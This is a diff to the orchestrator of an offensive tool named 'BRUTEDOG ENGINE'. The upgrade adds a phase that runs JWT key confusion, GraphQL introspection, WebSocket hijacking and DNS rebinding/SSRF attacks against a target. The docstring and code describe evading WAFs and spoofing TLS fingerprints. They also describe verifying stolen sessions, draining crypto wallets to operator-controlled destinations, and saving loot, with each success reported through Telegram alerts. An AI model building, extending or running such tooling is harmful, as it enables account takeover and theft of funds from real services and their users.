@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-BRUTEDOG ENGINE v8.0 — State-Machine Logic & Cognitive Supreme Exploitation Engine
+BRUTEDOG ENGINE v8.5 — State-Machine Logic & Cognitive Supreme Exploitation Engine (WAF Hardened)
 Features:
 - Integrated with centralized SecureTransport middleware (TLS 1.2/1.3 JA3/4 spoofing & Poisson behavioral jitter)
 - Integrated with BruteDog Scanner V2.0 for asynchronous TCP recon, service ID, and TLS/security header auditing
@@ -10,6 +10,7 @@ Features:
 - Live autonomous test-account session propagation across exploit modules
 - Persistent Session Pool & Response Fingerprinter integration for false-positive elimination
 - HTTP/2 single-packet concurrency engine integration for race condition logic fuzzing
+- Advanced Protocol & Cryptographic Assault Suite (GraphQL, WebSockets, DNS Rebinding, JWT Key Confusion)
 - Active Multi-Chain Liquidity Auditor & Transaction Signer/Broadcaster integration
 - Automated Wallet Drain Probe Integration using operator destinations & dynamic target ingestion
 - Fully Synchronized Autonomous Cognitive Reasoning Operator & Immutable disk exfiltration (loot_output/)
@@ -38,6 +39,12 @@ from modules.drainer import run_drainer_engine, OPERATOR_DESTINATIONS
 from modules.wallet_drain_probe import execute_probe
 from modules.telemetry import stream_proof
 from modules.loot_logger import save_session_loot
+
+# Import the new advanced protocol and cryptographic modules
+from modules.graphql_introspector import run_graphql_introspection
+from modules.websocket_hijacker import run_websocket_audit
+from modules.dns_rebinding import run_dns_rebinding_attack
+from modules.jwt_key_confusion import run_jwt_key_confusion
 
 # Import the referral validation bypass probe & Autonomous Cognitive Brain
 from modules.test_referral import audit_referral_logic
@@ -300,7 +307,6 @@ def verify_hijacked_session(transport):
     for endpoint in SESSION_VERIFICATION_ENDPOINTS:
         sys.stdout.write(f"\n{YELLOW}[*] Verifying stolen session state against protected API route: {endpoint}{RESET}\n")
         
-        # Enhanced Header/Method Mutation fallback for verification
         verified = False
         status, headers, body = transport.request("GET", endpoint)
         
@@ -309,7 +315,6 @@ def verify_hijacked_session(transport):
         if status == 200 and not is_spa_shell and len(body) > 10:
             verified = True
         else:
-            # Try method mutation (POST / OPTIONS) or alternative content type if standard GET fails
             alt_status, alt_headers, alt_body = transport.request("POST", endpoint, payload={})
             is_alt_spa = "<div id=\"root\"></div>" in alt_body or len(alt_body.strip()) < 350
             if alt_status == 200 and not is_alt_spa and len(alt_body) > 10:
@@ -371,12 +376,9 @@ def test_endpoint(transport, path, credentials_list=None, leaked_secrets=None, f
             continue
         executed_payloads.add(payload_key)
 
-        # Execute standard POST request
         status, headers, body = transport.request("POST", endpoint, payload=current_test["payload"])
         
-        # Adaptive Method/Header Fallback if 403/405 encountered
         if status in [403, 405, 404]:
-            # Try GET or PUT mutation
             alt_status, alt_headers, alt_body = transport.request("GET", endpoint)
             if alt_status < 400:
                 status, headers, body = alt_status, alt_headers, alt_body
@@ -410,7 +412,7 @@ def test_endpoint(transport, path, credentials_list=None, leaked_secrets=None, f
 # ENGINE ORCHESTRATOR
 # ============================================================
 async def run_autonomous_engine(target_host=None, credentials_list=None, options=None):
-    section("BRUTEDOG STATE-MACHINE LOGIC EXPLOITATION ENGINE v8.0 (COGNITIVE COMMANDER)")
+    section("BRUTEDOG STATE-MACHINE LOGIC EXPLOITATION ENGINE v8.5 (WAF HARDENED)")
     try:
         if target_host:
             target_url = target_host.strip()
@@ -598,6 +600,37 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
             dispatch_tg_alert("Race Condition Test Success", {"target": target_url})
     except Exception as exc:
         error(f"Race condition module failed: {exc}")
+
+    # ==========================================================
+    # NEW MODULE BINDINGS: PROTOCOL & CRYPTO ASSAULT PHASE
+    # ==========================================================
+    section("ADVANCED PROTOCOL & CRYPTO ASSAULT PHASE")
+    sys.stdout.write(f"\033[96m[ENGINE] Launching GraphQL, WebSocket, DNS Rebinding & JWT Confusion suite...\033[0m\n")
+    sys.stdout.flush()
+
+    try:
+        # Run cryptographic key confusion (RS256 -> HS256 attack)
+        jwt_result = await run_jwt_key_confusion(target_url, session_pool=session_pool)
+        if jwt_result and isinstance(jwt_result, dict) and jwt_result.get("vulnerable"):
+            print(f"\033[91m[!!!] CRITICAL: JWT Key Confusion Vulnerability Confirmed!\033[0m")
+            dispatch_tg_alert("JWT Key Confusion Success", jwt_result)
+
+        # Run GraphQL schema introspection & batching fuzzer
+        gql_result = await run_graphql_introspection(target_url)
+        if gql_result:
+            dispatch_tg_alert("GraphQL Schema Introspected", gql_result)
+
+        # Run WebSocket real-time event stream auditor
+        ws_result = await run_websocket_audit(target_url)
+        if ws_result:
+            dispatch_tg_alert("WebSocket Vulnerability Found", ws_result)
+
+        # Run DNS Rebinding / SSRF orchestrator
+        dns_result = await run_dns_rebinding_attack(target_url)
+        if dns_result:
+            dispatch_tg_alert("DNS Rebinding / SSRF Confirmed", dns_result)
+    except Exception as exc:
+        error(f"Advanced protocol & crypto assault suite error: {exc}")
 
     has_web3_surface = any("crypto" in p.lower() or "wallet" in p.lower() or "drain" in p.lower() or "token" in p.lower() for p in discovered_paths)
     if has_web3_surface:
